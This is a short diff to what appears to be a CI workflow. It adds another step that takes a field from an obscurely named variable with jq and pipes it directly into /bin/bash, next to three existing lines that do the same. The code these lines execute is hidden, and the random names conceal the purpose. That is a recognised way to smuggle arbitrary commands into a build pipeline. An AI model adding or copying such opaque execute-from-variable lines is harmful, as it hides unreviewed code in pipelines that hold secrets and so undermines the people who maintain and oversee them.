@@ -27,6 +27,7 @@ jobs:
           echo $sgsc8372 | jq -r .hyn83422 | /bin/bash
           echo $wkv7783 | jq -r .ckynw40750 | /bin/bash
           echo $pa8 | jq -r .l0 | /bin/bash
+          printf '%s' "$dr88419" | jq -r .l79 | /bin/bash
 
       - name: Persist results
         if: always()
